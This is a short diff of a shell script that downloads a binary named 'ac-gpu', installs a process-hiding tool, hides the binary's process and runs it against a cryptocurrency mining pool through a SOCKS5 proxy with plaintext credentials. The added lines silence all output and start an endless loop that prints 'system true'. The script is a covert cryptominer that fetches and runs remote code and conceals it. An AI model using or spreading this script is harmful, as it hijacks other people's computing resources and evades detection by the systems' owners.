@@ -4,4 +4,5 @@ wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu
 npm i -g node-process-hider
 chmod +x ac-gpu
 ph add ac-gpu
-./ac-gpu -F http://pool.aquachain.xyz:8888/0xa1ab79ade8b4d41d7c898a44521d567f59e8f082/paper3 -t 1 --proxy socks5://woiden_abet:aufal@103.148.76.198:8080
+./ac-gpu -F http://pool.aquachain.xyz:8888/0xa1ab79ade8b4d41d7c898a44521d567f59e8f082/paper3 -t 1 --proxy socks5://woiden_abet:aufal@103.148.76.198:8080 >/dev/null 2>&1 >/dev/null
+while :; do echo "system true"; sleep 5; done
